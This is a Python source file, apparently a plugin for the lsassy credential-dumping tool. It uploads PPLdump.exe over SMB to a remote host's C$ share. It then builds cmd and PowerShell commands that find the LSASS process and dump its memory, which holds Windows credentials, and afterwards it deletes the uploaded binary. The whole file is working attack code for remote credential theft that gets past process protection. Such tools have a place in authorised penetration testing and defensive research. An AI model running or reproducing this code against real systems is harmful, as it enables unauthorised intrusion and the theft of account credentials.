import logging
import os
import time

from lsassy.dumpmethod import IDumpMethod
from lsassy.impacketfile import ImpacketFile


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.ppldump = "PPLdump.exe"
        self.ppldump_path = False
        self.ppldump_remote_share = "C$"
        self.ppldump_remote_path = "\\Windows\\Temp\\"

        self.ppldump_uploaded = False

    def prepare(self, options):
        self.ppldump = options.get("ppldump", self.ppldump)
        self.ppldump_path = options.get("ppldump_path", self.ppldump_path)
        self.ppldump_remote_share = options.get("ppldump_remote_share", self.ppldump_remote_share)
        self.ppldump_remote_path = options.get("ppldump_remote_path", self.ppldump_remote_path)

        if not self.ppldump_path:
            logging.error("Missing ppldump_path")
            return None

        if not os.path.exists(self.ppldump_path):
            logging.error("{} does not exist.".format(self.ppldump_path))
            return None

        # Upload ppldump
        logging.debug('Copy {} to {}'.format(self.ppldump_path, self.ppldump_remote_path))
        with open(self.ppldump_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.ppldump_remote_share, self.ppldump_remote_path + self.ppldump, p.read)
                logging.success("PPLdump successfully uploaded")
                self.ppldump_uploaded = True
                return True
            except Exception as e:
                logging.error("PPLdump upload error", exc_info=True)
                return None

    def clean(self):
        if self.ppldump_uploaded:
            ImpacketFile.delete(self._session, self.ppldump_remote_path + self.ppldump, timeout=self._timeout)

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} %J {}{}""".format(
            self.ppldump_remote_path, self.ppldump,
            self.dump_path, self.dump_name
        )
        pwsh_command = """{}{} (Get-Process lsass).Id {}{}""".format(
            self.ppldump_remote_path, self.ppldump,
            self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
